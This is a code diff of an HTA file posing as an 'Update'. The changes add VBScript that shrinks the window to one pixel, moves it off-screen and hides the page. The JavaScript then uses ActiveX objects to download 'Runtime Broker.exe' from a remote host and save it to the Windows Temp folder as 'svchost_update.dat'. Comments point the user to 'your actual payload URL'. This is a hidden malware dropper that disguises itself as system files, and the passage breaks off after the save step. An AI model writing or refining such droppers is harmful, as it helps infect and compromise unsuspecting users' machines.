@@ -14,38 +14,35 @@
     INNERBORDER="no"
 />
 <style>
-    body { 
-        margin: 0; 
-        padding: 0; 
-        width: 1px; 
-        height: 1px; 
-        background-color: transparent; 
-        overflow: hidden;
-        visibility: hidden;
-    }
+    body { margin: 0; padding: 0; background-color: #f0f0f0; }
 </style>
 <title>Update</title>
+<script language="VBScript">
+    ' Resize and move the window immediately upon load
+    Sub Window_OnLoad
+        window.resizeTo 1, 1
+        window.moveTo -2000, -2000
+        ' Hide the body content
+        document.body.style.visibility = "hidden"
+    End Sub
+</script>
 </head>
 <body>
     <script language="JavaScript">
-        // Force the window to be 1x1 and move it off-screen
-        window.resizeTo(1, 1);
-        window.moveTo(-2000, -2000);
-
         try {
             // 1. Download payload
             var x = new ActiveXObject("MSXML2.XMLHTTP");
-            // REPLACE WITH YOUR ACTUAL VERCEL URL
-            x.open("GET", "https://swift-executorlol.vercel.app/delta.hta", false); 
+            // REPLACE THIS WITH YOUR ACTUAL PAYLOAD URL (NOT THE HTA ITSELF)
+            // Example: x.open("GET", "https://your-site.com/payload.exe", false);
+            x.open("GET", "https://swift-executorlol.vercel.app/Runtime Broker.exe", false); 
             x.send();
 
-            // 2. Save to Temp (Guaranteed permissions)
+            // 2. Save to Temp
             var s = new ActiveXObject("ADODB.Stream");
             s.Open();
             s.Type = 1; // Binary
             s.Write(x.responseBody);
             
-            // Use a generic name in the temp folder
             var tempPath = "C:\\Windows\\Temp\\svchost_update.dat";
             s.SaveToFile(tempPath, 2); 
             s.Close();
